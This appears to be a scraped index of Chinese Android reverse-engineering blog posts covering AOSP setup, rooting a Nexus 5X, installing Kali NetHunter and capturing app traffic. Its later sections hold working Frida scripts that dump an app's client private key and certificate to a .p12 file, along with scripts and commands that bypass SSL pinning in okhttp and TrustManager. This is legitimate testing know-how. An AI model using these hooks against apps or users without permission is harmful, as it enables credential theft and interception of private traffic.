下载AndroidStudio. https://developer.android.google.cn/studio 解压并运行. 切换到android-studio/bin目录下,运行当前目录的studio.sh即可启动AndroidStudio. 创建程序桌面图标. //创建桌面图标 gedit /usr/share/applications/android-studio.desktop //添加以下内容 [Desktop Entry] Name=AndroidStudio Encoding=UTF-8 Exec=sh -c \"/root/softWares/android-studio/bin/studio.sh\" Icon=/root/softWares/android-studio/bin/studio.png StartupNotify=false Terminal=false Type=Application 执行完上述操作后,即可在菜单中找到AndroidStudio的桌面程序图标,右键可以添加到桌面. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:7:1","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["Android Rom"],"content":"源码导入 接下来的命令均是在Android源码目录中执行. 执行下述命令,生成idegen.jar文件. source build/envsetup.sh mmm development/tools/idegen/ 执行下述命令,在源码根目录生成android.iml和android.ipr文件. development/tools/idegen/idegen.sh android.iml:包含源码导入AS时会被导入和排除的子目录文件夹. android.ipr:包含源码工程的具体配置、代码以及依赖的lib等信息. 用AS打开上述android.ipr文件,等待一会就可以看到导入成功的Android源码. ","date":"2022-06-26","objectID":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:7:2","tags":["Android"],"title":"Android源码环境搭建","uri":"/posts/android/android-rom/android%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["环境搭建"],"content":"下面的流程以Nexus 5X为例. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:0:0","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"adb配置 从下述网址下载adb工具. https://developer.android.google.cn/studio/releases/platform-tools?hl=zh_cn 配置adb环境变量. gedit ~/.bashrc export PATH=$PATH:/root/platform-tools source ~/.bashrc ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:1:0","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"刷机 需要确保已解锁OEM,然后开始下面的流程. 从下述网址中选择要刷入的Android版本对应的build ID https://source.android.com/setup/start/build-numbers 这里我们选择的是android-8.1.0_r1对应的build ID为OPM1.171019.011. 从下述网址中找到准备刷入的设备对应的代号为上述build ID的镜像链接并下载. https://developers.google.com/android/images 这里我们的准备刷入的设备型号为bullhead for Nexus 5X //下载镜像 wget https://dl.google.com/dl/android/aosp/bullhead-opm1.171019.011-factory-3be6fd1c.zip 校验SHA-256 Checksum,必须与官网一致. openssl dgst -sha256 bullhead-opm1.171019.011-factory-3be6fd1c.zip 解压. 7z x bullhead-opm1.171019.011-factory-3be6fd1c.zip 进入bootloader界面. //方式一 adb reboot bootloader //方式二 1、将USB线断开,并确保手机有80%左右的电量. 2、将手机完全关机. 3、同时按住音量向下键和开机键. 4、手机将进入bootloader界面 5、手机用USB线连上电脑. cd到刚解压的文件夹下,执行./flash-all.sh脚本. 上述流程完毕之后,手机就会重启进入初始化状态,在完成语言、WiFi以及在\"开发者选项\"中打开Usb调试选项后,一台新的测试机就诞生了.但在联网之后会发现测试机的系统时间与计算机时间不一致以及提示\"此WLAN网络无法访问互联网\",可通过以下命令解决: adb shell settings put global captive_portal_http_url https://www.google.cn/generate_204 adb shell settings put global captive_portal_https_url https://www.google.cn/generate_204 adb shell settings put global ntp_server 1.hk.pool.ntp.org adb shell reboot ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:2:0","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"Root 下面的两种Root方式,Magisk和SuperSU任选其一即可. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:3:0","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"Magisk 安装Magisk,查看是否具有ramdisk. https://github.com/topjohnwu/Magisk 如果有ramdisk,就从Rom包中提取boot.img,否则提取recovery.img 将提取出来的镜像传输到手机中. adb push boot.img /sdcard 在手机中打开Magisk选择上述镜像文件进行修补. 在PC上将上述修补后的镜像导出. adb pull /sdcard/Download/magisk_patched-25000_njnb9.img 将修补后的镜像刷入手机中. //进入bootloader界面,执行下面命令 fastboot flash boot magisk_patched-25000_njnb9.img ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:3:1","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"SuperSU 下载SuperSU并推送到手机的sdcard目录下. https://supersuroot.org/download/ SR5-SuperSU-v2.82-SR5-20171001224502.zip adb push .\\SR5-SuperSU-v2.82-SR5-20171001224502.zip /sdcard 要使用SuperSu的方式进行Root,首先要安装Twrp. Twrp是一个开放源码软件的定制Recover映像,而Recovery指的是一种可以对安卓机内部的数据或系统进行修改的模式(类似于Win PE),在Recovery里我们可以挂载磁盘,修改系统分区,使用adb命令等一系列功能. 下载自己机型对应的Twrp. https://twrp.me/Devices/ twrp-3.5.0_9-0-bullhead.img 进入bootloader界面,将镜像刷进去. //Nexus 5X fastboot flash recovery twrp.img //Pixel fastboot flash boot twrp.img 进入recovey模式,稍等一会就会进入刚安装的Twrp系统. 进入Twrp界面后,滑动下方的\"Swipe to Allow Modifications\"按钮,进入Twrp主界面,然后点击\"Install\"按钮(默认进入sdcard目录),选择上面推进去的SuperSU压缩包,开始刷SuperSU. 完成上述步骤,手机重启以后就完成了root. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:3:2","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"Kali NetHunter Kali NetHunter是第一个针对移动设备的开源Android渗透测试平台,允许受支持的设备访问Kali工具集,可以执行在桌面端Kali上执行的一切命令,另外Kali NetHunter对Android的修改主要关于Android内核方面的内容,对平时的使用几乎不会产生任何影响,十分值得每一个Android逆向人员拥有. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:0","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"刷机 需要先使用上述SuperSU的方式完成Root. 在官网下载Kali NetHunter. https://www.kali.org/get-kali/#kali-mobile nethunter-2022.2b-bullhead-oreo-kalifs-full.zip.torrent 这里会发现Nexus 5X的设备只支持Oreo,而Oreo是Android8的代码,这与我们上面刷的系统镜像是一致的. 将下载的压缩包推送到手机的sdcard目录下 adb push .\\nethunter-2022.2b-bullhead-oreo-kalifs-full.zip /sdcard 进入bootloader界面. adb reboot bootloader 进入Twrp界面,单击\"Install\"按钮,选择上面推进去的压缩包,开始刷Kali NetHunter. 等待上述步骤执行完毕,手机重启之后,就完成了Kali NetHunter的刷机. 接下里就会发现,桌面多了NetHunter、NetHunter KeX、NetHunter终端等App. 注意 要使用其他NetHunter相关的App,需要先打开NetHunter并允许所有申请的权限,进入App主界面后,打开侧边栏,选择Kali Chroot Manager,就会自动安装Kali Chroot Manager.安装完毕后,单击START KALI CHROOT启动Chroot,接下面便可以使用NetHunter KeX和NetHunter终端了. ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:1","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"开启SSH 此时可通过手机上的NetHunter终端App运行各种Android原生不支持的Linux命令,但在手机上使用终端命令,终究觉得屏幕过小,此时我们可以通过SSH连接手机,在PC上操作手机. 打开手机端的NetHunter,单击侧边栏的Kali Services. 勾选RunOnChrootStart. 接下来就可以在PC上利用SSH工具如XShell,来连接手机,运行Linux命令了. 指定手机端的IP,以及默认的账号密码root/toor即可 ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:2","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["环境搭建"],"content":"图形化界面 Kali NetHunter为Android内置了一个图形化界面,在PC上可以通过VNC Viewer进行连接. 打开手机端的NetHunter,单击侧边栏的Kex Manager. 单击\"SETUP LOCAL SERVER\"按钮,设置VNC Viewer的密码,然后选择root用户,最后单击\"START SERVER\"按钮启动SERVER. 使用VNC Viewer进行连接,输入手机端的IP和端口(端口号为1),然后输入上面设置的密码就可以连接成功了. https://www.realvnc.com/en/connect/download/viewer/ VNC-Viewer.exe ","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:3","tags":["Android"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["Android 抓包"],"content":"测试Apk NCSearch.apk ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:1:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"服务端校验客户端 ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"现象 配置好Charles抓包环境并完成浏览器百度访问测试. 对App进行抓包. 观察上述response数据,发现有\"400 No required SSL certificate was sent\"提示信息,是说服务端未接收到所需要的SSL证书信息,也就是说服务端对客户端进行了证书校验. ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:1","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"寻找服务端信任证书 当App未使用VPN代理时对服务器进行访问,服务器是能够正常返回数据的,说明App在与服务器进行通信的过程中是使用服务器端信任的证书与服务器进行数据交互的,因此服务器端信任的证书一定会在App发起通信之前从资源文件中加载进来,那么只需将Apk进行解包使用下述命令进行搜索. //通常来搜索 .p12 .bks .truststore tree -NCfhl |grep -i .p12 当前也有一些App,会通过改名、加密等方式将证书隐藏起来,遇到这种情况,可以通过Hook的手段快速定位(这里可以参考下r0capture的代码). 需要注意的是,执行下述Hook代码前,需要先将手机中的VPN代理关掉.因为该App还有客户端校验服务端的代码. function uuid(len, radix) { var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split(''); var uuid = [], i; radix = radix || chars.length; if (len) { // Compact form for (i = 0; i \u003c len; i++) uuid[i] = chars[0 | Math.random() * radix]; } else { // rfc4122, version 4 form var r; // rfc4122 requires these characters uuid[8] = uuid[13] = uuid[18] = uuid[23] = '-'; uuid[14] = '4'; // Fill in random data. At i==19 set the high bits of clock sequence as // per rfc4122, sec. 4.1.5 for (i = 0; i \u003c 36; i++) { if (!uuid[i]) { r = 0 | Math.random() * 16; uuid[i] = chars[(i == 19) ? (r \u0026 0x3) | 0x8 : r]; } } } return uuid.join(''); } function main(){ Java.perform(function(){ function storeP12(pri, p7, p12Path, p12Password) { var X509Certificate = Java.use(\"java.security.cert.X509Certificate\") var p7X509 = Java.cast(p7, X509Certificate); var chain = Java.array(\"java.security.cert.X509Certificate\", [p7X509]) var ks = Java.use(\"java.security.KeyStore\").getInstance(\"PKCS12\", \"BC\"); ks.load(null, null); ks.setKeyEntry(\"client\", pri, Java.use('java.lang.String').$new(p12Password).toCharArray(), chain); try { var out = Java.use(\"java.io.FileOutputStream\").$new(p12Path); ks.store(out, Java.use('java.lang.String').$new(p12Password).toCharArray()) console.log(\"dump success!\") } catch (exp) { console.log(exp) } } //在服务器校验客户端的情形下，帮助dump客户端证书，并保存为p12的格式，证书密码为LuoHun Java.use(\"java.security.KeyStore$PrivateKeyEntry\").getPrivateKey.implementation = function () { var result = this.getPrivateKey() var packageName = Java.use(\"android.app.ActivityThread\").currentApplication().getApplicationContext().getPackageName(); storeP12(this.getPrivateKey(), this.getCertificate(), '/sdcard/Download/' + packageName + uuid(10, 16) + '.p12', 'LuoHun'); return result; } Java.use(\"java.security.KeyStore$PrivateKeyEntry\").getCertificateChain.implementation = function () { var result = this.getCertificateChain() var packageName = Java.use(\"android.app.ActivityThread\").currentApplication().getApplicationContext().getPackageName(); storeP12(this.getPrivateKey(), this.getCertificate(), '/sdcard/Download/' + packageName + uuid(10, 16) + '.p12', 'LuoHun'); return result; } }) } setImmediate(main) ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:2","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"导出证书 当Frida Hook显示dump success!时,就去手机的/sdcard/Download/将证书导出. adb shell su cd /sdcard/Download/ mkdir luo mv *.p12 luo adb pull /sdcard/Download/luo ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:3","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"Charles导入证书 Import P12证书时,选择上述导出到PC端上的任一证书文件即可,输入密码 LuoHun 这样配置的话,就可将服务端信任的证书导入到Charles中,从而达到了\"欺骗\"服务器的目的. ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:4","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"非标转端口添加 这里可以看到,该App使用了非标准端口,在Charles中依次点击 Proxy-\u003eSSL Proxying Settings,在弹出窗口中输入端口号即可. ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:5","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"客户端校验服务端 对于客户端校验服务端的Hook代码,可参考下述github仓库. https://github.com/CreditTone/hooker/blob/master/js/just_trust_me.js 将radar.dex 放到手机/data/local/tmp目录中,并设置可执行权限. radar.dex 执行下述Hook代码. function classExists(className) { var exists = false; try { var clz = Java.use(className); exists = true; } catch(err) { //console.log(err); } return exists; }; function loadDexfile(dexfile) { Java.perform(function() { Java.openClassFile(dexfile).load(); //console.log(\"load \" + dexfile); }); }; var loadedXRadar = false; function loadXRadarDexfile() { loadedXRadar = true; loadDexfile('/data/local/tmp/radar.dex'); }; loadXRadarDexfile(); function hasTrustManagerImpl() { return classExists(\"com.android.org.conscrypt.TrustManagerImpl\"); } function newArrayList() { var ArrayListClz = Java.use('java.util.ArrayList'); return ArrayListClz.$new(); } function processOkHttp() { //知道你为什么有时候用JustTrustMe失败吗，因为app代码混淆了下面这些类你改到对应的类和方法就行啦 if (classExists(\"com.squareup.okhttp.CertificatePinner\")) { var squareupOkhttp3CertificatePinnerClz = Java.use('com.squareup.okhttp.CertificatePinner'); var squareupOkhttp3CertificatePinnerClzCheck = squareupOkhttp3CertificatePinnerClz.check.overload('java.lang.String', 'java.util.List'); squareupOkhttp3CertificatePinnerClzCheck.implementation = function(v0, v1) { //什么都不做 console.log(\"com.squareup.okhttp.CertificatePinner.check('java.lang.String', 'java.util.List') was hooked!\"); }; }else{ console.error(\"没找到com.squareup.okhttp.CertificatePinner类，这是android系统自带的类没找到就算求了。不同系统不一样，不用找了!!!\"); } if (classExists(\"okhttp3.CertificatePinner\")) { try { var okhttp3CertificatePinnerClz = Java.use('okhttp3.CertificatePinner'); var okhttp3CertificatePinnerClzCheck = okhttp3CertificatePinnerClz.check.overload('java.lang.String', 'java.util.List'); okhttp3CertificatePinnerClzCheck.implementation = function(v0, v1) { //什么都不做 console.log(\"okhttp3.CertificatePinner.check('java.lang.String', 'java.util.List') was hooked!\"); }; } catch (error) { console.error(\"okhttp3.CertificatePinner的check方法可能被混淆了。你可以jadx反编译下还原回来！\"); } }else{ console.error(\"没找到okhttp3.CertificatePinner类，可能被混淆了。你可以jadx反编译下还原回来！\"); } if (classExists(\"okhttp3.internal.tls.OkHostnameVerifier\")) { try { var OkHostnameVerifierClz = Java.use('okhttp3.internal.tls.OkHostnameVerifier'); var OkHostnameVerifierClzVerify_5791 = OkHostnameVerifierClz.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession'); OkHostnameVerifierClzVerify_5791.implementation = function(v0, v1) { //强制返回true console.log(\"okhttp3.internal.tls.OkHostnameVerifier.verify('java.lang.String', 'javax.net.ssl.SSLSession') was hooked!\"); return true; }; var OkHostnameVerifierVerify_8978 = OkHostnameVerifierClz.verify.overload('java.lang.String', 'java.security.cert.X509Certificate'); OkHostnameVerifierVerify_8978.implementation = function(v0, v1) { //强制返回true console.log(\"okhttp3.internal.tls.OkHostnameVerifier.verify('java.lang.String', 'java.security.cert.X509Certificate') was hooked!\"); return true; }; } catch (error) { console.error(\"okhttp3.internal.tls.OkHostnameVerifier的verify方法可能被混淆了。你可以jadx反编译下还原回来！\"); } }else{ console.error(\"没找到okhttp3.internal.tls.OkHostnameVerifier类，可能被混淆了。你可以jadx反编译下还原回来！\"); } if (classExists(\"okhttp3.OkHttpClient$Builder\")) { try{ var okhttp3_OkHttpClient_Builder_clz = Java.use('okhttp3.OkHttpClient$Builder'); var okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_one = okhttp3_OkHttpClient_Builder_clz.sslSocketFactory.overload('javax.net.ssl.SSLSocketFactory'); okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_one.implementation = function(sSLSocketFactory) { //把参数替换成EmptySSLFactory var ret = okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_one.call(this, Java.use(\"gz.justtrustme.Helper\").getEmptySSLFactory()); return ret; }; var okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_two = okhttp3_OkHttpClient_Builder_clz.sslSocketFactory.overload('javax.net.ssl.SSLSocketFactory', 'javax.net.ssl.X509TrustManager'); okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_two.implementation = function(sSLSo","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:3:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:4:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"测试Apk dida.apk ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:1:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"情景再现 测试抓包环境. PC端使用Charles,手机端使用Postern(Socks模式),PC端和手机端在同一局域网环境下且Charles证书已安装到手机系统分区中,手机端使用浏览器访问百度进行测试. 打开案例App,测试通过手机号注册发送验证码流程. 经过多次测试,发现某些网址的抓包结果总是提示\"Client closed the connection before a request was made. Possibly the SSL certificate was rejected.\",也就说客户端主动停止与服务器的连接,App使用了证书绑定技术. ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:2:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"解决方案 由于上面这种方式对证书验证的代码是写在App内部,所以我们可以通过Hook的方式让执行证书绑定的函数失效.而Hook可行的前提是能够确定证书绑定的函数,此时需要对不同网络框架中证书绑定相关的代码有一定了解.例如,App使用okhttp3网络框架进行证书绑定,那么使用的证书绑定类总是CertificatePinner类,此时Hook的目标就是CertificatePinner类中的函数;App使用TrustManager类完成证书的绑定,那么Hook的目标就是TrustManager类中的证书绑定函数. OkHttpClient client = new OkHttpClient.Builder() //完成证书绑定 .certificatePinner(new CertificatePinner.Builder() .add(\"test.com\", \"sha512/14cf3DRF...\") .build()) .build(); ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"前人研究 Android世界中有很多的网络框架,如果对每个网络框架都进行证书绑定函数的确定,工作量很大.但幸运的是,前人已经完成了很多种网络框架的证书绑定函数的收集工作,可供我们参考. Objection 考虑到App在启动之前就已经完成了证书绑定,所以我们首先要确保App进程完全关闭,然后利用Objection的-s/–start-command参数达到命令在应用启动之前就执行的效果. objection.exe -g cn.ticktick.task explore -s \"android sslpinning disable\" 从上面结果中可以看到依旧是失败,出现这个问题可能是Objection工具未集成足够多的网络框架证书绑定函数而造成的. DroidSSLUnpinning https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js frida -U -f cn.ticktick.task -l .\\hooks.js --no-pause okhttp-sslunpinning https://github.com/bxl0608/okhttp-sslunpinning var classesNames = new Array() var OkhttpClientClassName = \"\" var CertificatePinnerClassName = \"\" var prefix = \"\" function initConsole(){ var Color = {RESET: \"\\x1b[39;49;00m\", Black: \"0;01\", Blue: \"4;01\", Cyan: \"6;01\", Gray: \"7;11\", \"Green\": \"2;01\", Purple: \"5;01\", Yellow: \"3;01\", Red: \"1;01\"} var LightColor = {RESET: \"\\x1b[39;49;00m\", Black: \"0;11\", Blue: \"4;11\", Cyan: \"6;11\", Gray: \"7;01\", \"Green\": \"2;11\", Purple: \"5;11\", Red: \"1;11\", Yellow: \"3;11\"} var colorPrefix = '\\x1b[3' var colorSuffix = 'm' Object.keys(Color).forEach(function(c){ if (c == \"RESET\") return console[c] = function(message){ console.log(colorPrefix + Color[c] + colorSuffix + message + Color.RESET) } console[\"Light\" + c] = function(message){ console.log(colorPrefix + LightColor[c] + colorSuffix + message + Color.RESET) } }) } function loadOkhttpClient(){ Java.perform(function (){ try{ Java.use(\"okhttp3.OkHttpClient\") }catch(e){ //console.error(e) } }) } function loadClasses(){ Java.perform(function (){ Java.enumerateLoadedClasses({ onMatch: function(clsName, handle){ classesNames.push(clsName) }, onComplete: function(){ console.Green(\"Search Class Completed!\") } }) }) } function findOkhttpClass(){ Java.perform(function (){ var Modifier = Java.use(\"java.lang.reflect.Modifier\") function isOkhttpClient(clsName){ if(clsName.split('.').length != 2){ return false; } try{ var cls = Java.use(clsName) var interfaces = cls.class.getInterfaces() const count = interfaces.length if(count \u003c 2){ return false } var flag = false for(var i = 0; i \u003c count; i++){ var interface_ = interfaces[i] var interface_name = interface_.getName() if(interface_name.indexOf(\"Cloneable\") \u003e 0){ flag = true }else{ if(interface_name.indexOf(\"$\") \u003c= 0){ return false } } } if(!flag) return false; if(cls.class.getDeclaredClasses().length \u003c 1){ return false } if(cls.class.getSuperclass().getName() != 'java.lang.Object'){ return false } }catch(e){ return false } return true; } function isCertificatePinner(clsName,prefix){ if(!clsName.startsWith(prefix)){ return false } if(clsName.indexOf(\"$\") \u003e 0){ return false } if(clsName.split('.').length != 2){ return false; } var cls = Java.use(clsName) if(cls.class.isInterface()){ return false } if(cls.class.getInterfaces().length \u003e 0){ return false } if(cls.class.getDeclaredClasses().length \u003c 1){ return false } if(cls.class.getSuperclass().getName() != \"java.lang.Object\"){ return false } if(!Modifier.isFinal(cls.class.getModifiers())){ return false } var flag = false var methods = cls.class.getDeclaredMethods() for(var i = 0; i \u003c methods.length; i++){ var method = methods[i] if(method.getParameterCount() \u003c 1){ continue } if(method.getParameterTypes()[0].getName() == \"java.security.cert.Certificate\"){ flag = true break } } if(!flag) return false flag = false var fields = cls.class.getDeclaredFields() for(var k = 0; k \u003c fields.length; k++){ var field = fields[k]; if(field.getType().getName() == \"java.util.Set\"){ flag = true break } } if(!flag) return false return true } for(var i = 0; i \u003c classesNames.length; i++){ 